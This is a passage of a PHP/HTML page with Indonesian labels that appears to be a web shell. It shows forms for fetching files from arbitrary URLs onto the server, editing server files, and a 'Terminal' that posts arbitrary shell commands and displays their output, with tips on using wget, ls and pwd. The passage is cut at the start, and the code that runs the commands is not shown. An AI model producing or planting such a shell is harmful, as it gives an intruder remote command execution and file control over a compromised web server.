            <button type="submit" style="width:100%;">Buat</button>
        </form>
    </div>
</div>

<!-- ==================== DOWNLOAD URL ==================== -->
<div class="download-form">
    <h3 style="margin-top:0; color:#FFD700;">📥 Download dari URL</h3>
    <form method="post">
        <input type="url" name="url_download" placeholder="https://example.com/file.zip" style="width:100%; max-width:500px;" required>
        <input type="text" name="url_filename" placeholder="Nama file (opsional)" style="width:100%; max-width:500px; margin-top:5px;">
        <button type="submit" style="margin-top:10px;">Download</button>
    </form>
</div>

<!-- ==================== EDIT FILE ==================== -->
<?php
if (isset($_GET['edit'])):
    $edit = realpath($path . '/' . $_GET['edit']);
    if ($edit && strpos($edit, $path) === 0 && is_file($edit)):
        $isi = htmlspecialchars(file_get_contents($edit));
?>
<h3 style="color:#FFD700;">✏️ Edit File: <?php echo basename($edit); ?></h3>
<form method="post">
    <textarea name="content"><?php echo $isi; ?></textarea>
    <div style="margin-top:10px;">
        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
        <button type="submit">💾 Save</button>
        <a href="?path=<?php echo urlencode($path); ?>" class="button">⬅️ Kembali</a>
    </div>
</form>
<?php endif; endif; ?>

<!-- ==================== TERMINAL ==================== -->
<hr>
<h3 style="color:#FFD700;">💻 Terminal</h3>
<form method="post">
    <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <input type="text" name="cmd" style="flex:1; min-width:200px; padding:12px; font-family:monospace;" 
               placeholder="Contoh: ls -la, pwd, wget https://example.com/file.zip" 
               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <button type="submit" style="padding:12px 25px;">Run</button>
    </div>
</form>

<?php if (isset($output)): ?>
<div class="terminal">
    <pre style="margin:0; white-space:pre-wrap;"><?php echo htmlspecialchars($output); ?></pre>
</div>
<?php endif; ?>

<!-- ==================== COMMAND HELP ==================== -->
<div style="margin-top:10px; font-size:12px; color:#999;">
    💡 Tips: Gunakan 'wget URL' untuk download, 'ls -la' untuk list file, 'pwd' untuk lihat path
</div>

</body>
</html>
